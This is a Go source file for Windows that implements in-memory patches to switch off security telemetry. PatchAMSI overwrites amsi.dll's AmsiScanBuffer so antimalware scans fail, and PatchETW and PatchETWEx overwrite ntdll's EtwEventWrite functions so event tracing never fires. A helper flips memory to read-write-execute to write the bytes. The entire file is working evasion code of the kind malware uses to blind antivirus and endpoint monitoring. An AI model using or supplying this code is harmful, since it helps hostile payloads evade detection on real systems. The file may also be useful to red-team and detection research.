//go:build windows

package win

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	pageExecuteReadWrite = 0x40
	pageExecuteRead      = 0x20
	memCommit            = 0x1000
)

// PatchAMSI neutralises amsi.dll!AmsiScanBuffer by patching its preamble to
// return E_INVALIDARG immediately: `mov eax, 0x80070057; ret`.
func PatchAMSI() error {
	amsi, err := windows.LoadLibrary("amsi.dll")
	if err != nil {
		return err
	}
	target, err := Resolve(uintptr(amsi), "AmsiScanBuffer")
	if err != nil {
		return err
	}
	// 0xB8 <dword> C3  == mov eax, imm32; ret
	payload := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	if _, err := patchBytes(target, payload); err != nil {
		return err
	}
	return nil
}

// PatchETW neutralises ntdll!EtwEventWrite so ETW callbacks never run.
func PatchETW() error {
	ntdll := ModuleNtdll()
	if ntdll == 0 {
		return errNoNtdll
	}
	target, err := Resolve(ntdll, "EtwEventWrite")
	if err != nil {
		return err
	}
	// xor eax, eax; ret  == STATUS_SUCCESS
	payload := []byte{0x31, 0xC0, 0xC3}
	if _, err := patchBytes(target, payload); err != nil {
		return err
	}
	return nil
}

// PatchETWEx patches both EtwEventWrite and the ntdll WMI variant.
func PatchETWEx() error {
	if err := PatchETW(); err != nil {
		return err
	}
	ntdll := ModuleNtdll()
	if addr, err := Resolve(ntdll, "EtwEventWriteEx"); err == nil {
		_, _ = patchBytes(addr, []byte{0x31, 0xC0, 0xC3})
	}
	return nil
}

// patchBytes flips a region to RWX, writes payload, restores EXECUTE_READ.
func patchBytes(target uintptr, payload []byte) (uint32, error) {
	var old uint32
	// First make writable (best-effort; the region may already be RWX).
	_, _ = VirtualProtectLocal(target, uintptr(len(payload)), pageExecuteReadWrite)
	oldProt, err := VirtualProtectLocal(target, uintptr(len(payload)), pageExecuteReadWrite)
	if err == nil {
		old = oldProt
	}
	for i := 0; i < len(payload); i++ {
		*(*byte)(unsafe.Pointer(target + uintptr(i))) = payload[i]
	}
	// Restore readable+executable.
	_, _ = VirtualProtectLocal(target, uintptr(len(payload)), pageExecuteRead)
	return old, nil
}
